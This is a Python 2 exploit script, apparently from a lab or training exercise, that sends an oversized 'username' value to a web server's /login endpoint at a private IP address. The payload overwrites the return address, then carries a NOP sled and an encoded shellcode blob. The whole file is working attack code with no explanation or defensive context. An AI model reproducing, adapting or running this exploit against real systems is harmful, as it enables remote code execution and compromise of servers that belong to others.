#!/usr/bin/python
import socket
import time
import sys

shellcode = ("\xda\xd0\xbb\x32\xae\xb0\x1b\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x31\x5a\x17\x03\x5a\x17\x83\xf0\xaa\x52\xee\x08\x5a\x10"
"\x11\xf0\x9b\x75\x9b\x15\xaa\xb5\xff\x5e\x9d\x05\x8b\x32\x12"
"\xed\xd9\xa6\xa1\x83\xf5\xc9\x02\x29\x20\xe4\x93\x02\x10\x67"
"\x10\x59\x45\x47\x29\x92\x98\x86\x6e\xcf\x51\xda\x27\x9b\xc4"
"\xca\x4c\xd1\xd4\x61\x1e\xf7\x5c\x96\xd7\xf6\x4d\x09\x63\xa1"
"\x4d\xa8\xa0\xd9\xc7\xb2\xa5\xe4\x9e\x49\x1d\x92\x20\x9b\x6f"
"\x5b\x8e\xe2\x5f\xae\xce\x23\x67\x51\xa5\x5d\x9b\xec\xbe\x9a"
"\xe1\x2a\x4a\x38\x41\xb8\xec\xe4\x73\x6d\x6a\x6f\x7f\xda\xf8"
"\x37\x9c\xdd\x2d\x4c\x98\x56\xd0\x82\x28\x2c\xf7\x06\x70\xf6"
"\x96\x1f\xdc\x59\xa6\x7f\xbf\x06\x02\xf4\x52\x52\x3f\x57\x3b"
"\x97\x72\x67\xbb\xbf\x05\x14\x89\x60\xbe\xb2\xa1\xe9\x18\x45"
"\xc5\xc3\xdd\xd9\x38\xec\x1d\xf0\xfe\xb8\x4d\x6a\xd6\xc0\x05"
"\x6a\xd7\x14\x89\x3a\x77\xc7\x6a\xea\x37\xb7\x02\xe0\xb7\xe8"
"\x33\x0b\x12\x81\xde\xf6\xf5\x6e\xb6\x8f\xc1\x07\xc5\x6f\xdb"
"\x8b\x40\x89\xb1\x23\x05\x02\x2e\xdd\x0c\xd8\xcf\x22\x9b\xa5"
"\xd0\xa9\x28\x5a\x9e\x59\x44\x48\x77\xaa\x13\x32\xde\xb5\x89"
"\x5a\xbc\x24\x56\x9a\xcb\x54\xc1\xcd\x9c\xab\x18\x9b\x30\x95"
"\xb2\xb9\xc8\x43\xfc\x79\x17\xb0\x03\x80\xda\x8c\x27\x92\x22"
"\x0c\x6c\xc6\xfa\x5b\x3a\xb0\xbc\x35\x8c\x6a\x17\xe9\x46\xfa"
"\xee\xc1\x58\x7c\xef\x0f\x2f\x60\x5e\xe6\x76\x9f\x6f\x6e\x7f"
"\xd8\x8d\x0e\x80\x33\x16\x3e\xcb\x19\x3f\xd7\x92\xc8\x7d\xba"
"\x24\x27\x41\xc3\xa6\xcd\x3a\x30\xb6\xa4\x3f\x7c\x70\x55\x32"
"\xed\x15\x59\xe1\x0e\x3c")
try:
    print "\nSending evil buffer "
    filter = "A" * 780
    eip = "\x83\x0c\x09\x10"
    offset = "C" * 4
    nops = "\x90" * 10
    inputBuffer = filter + eip + offset + nops + shellcode
    content = "username=" + inputBuffer + "&password=A"
    sock_buffer = "POST /login HTTP/1.1\r\n"
    sock_buffer += "Host: 192.168.196.10\r\n"
    sock_buffer += "User - Agent: Mozilla / 5.0 (X11; Linux_86_64; rv: 52.0) Gecko / 20100101Firefox / 52.0\r\n"
    sock_buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    sock_buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    sock_buffer += "Referer: http://192.168.196.10/login\r\n"
    sock_buffer += "Connection: close\r\n"
    sock_buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    sock_buffer += "Content-Length: " + str(len(content)) + "\r\n"
    sock_buffer += "\r\n"
    sock_buffer += content
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.196.10", 80))
    s.send(sock_buffer)
    s.close()
    print "\nDone!"
except:
    print "Could not connect!"
